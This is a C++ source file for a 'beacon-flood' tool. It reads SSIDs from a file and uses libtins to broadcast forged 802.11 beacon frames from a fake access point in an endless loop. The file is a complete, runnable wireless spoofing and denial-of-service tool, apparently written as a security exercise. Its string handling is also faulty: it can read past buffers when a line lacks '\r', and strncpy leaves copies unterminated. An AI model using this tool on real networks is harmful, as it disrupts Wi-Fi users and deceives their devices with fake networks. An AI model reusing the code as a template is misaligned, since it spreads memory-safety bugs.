#include <unistd.h>
#include <list>
#include <tins/tins.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <cstdio>
#include <pcap.h>
#include <header.h>
#include <fstream>
#include <iostream>
#include <string>
#include <cstring>

using namespace std;
using namespace Tins;

struct radiotap_hdr{
    u_int8_t it_version;    /* set to 0 */
    u_int8_t it_pad;        /* entire length */
    u_int16_t it_len;
    u_int32_t it_present;   /* fields present */
};

void usage() {
    printf("syntax : beacon-flood <interface> <ssid-list-file>\n");
    printf("sample : beacon-flood mon0 ssid-list.txt\n");
}

char len_count(char *buf){
    int count=0;
    int i=0;
    while(buf[i]!='\r'){
        if(buf[i]!=' '){
            count ++;
        }
        i++;
    }
    return count;
}

int main(int argc, char* argv[])
{
    if (argc != 3) {
           usage();
           return -1;
       }

    char buf[100];
    char *push;
    int len=0;

    list<string> ssidList;

    ifstream fp(argv[2]);
    if (!fp.is_open()) {
       cout << "Error" << endl;
       return 0;
     }

     while (fp) {
       fp.getline(buf, 100);
       cout << buf << endl;
       len = len_count(buf);
       push = new char[len];
       strncpy(push, buf, len);
       ssidList.push_back(push);
       delete[] push;
     }
     fp.close();

     list<string>::iterator it = ssidList.begin();
     while (true) {
     RadioTap tap;

     Dot11::address_type ap        = "00:11:22:33:44:55";
     Dot11::address_type broadcast = "ff:ff:ff:ff:ff:ff";
     Dot11Beacon beacon(broadcast, ap);
     beacon.addr4(ap);
     beacon.ssid(*it);
     beacon.ds_parameter_set(10);
     beacon.supported_rates({ 1.0f, 5.5f, 11.0f });
     tap.inner_pdu(beacon);

     PacketSender sender(argv[1]);
     sender.send(tap);
     usleep(10000);

     if (++it == ssidList.end())
       it = ssidList.begin();
  }
}
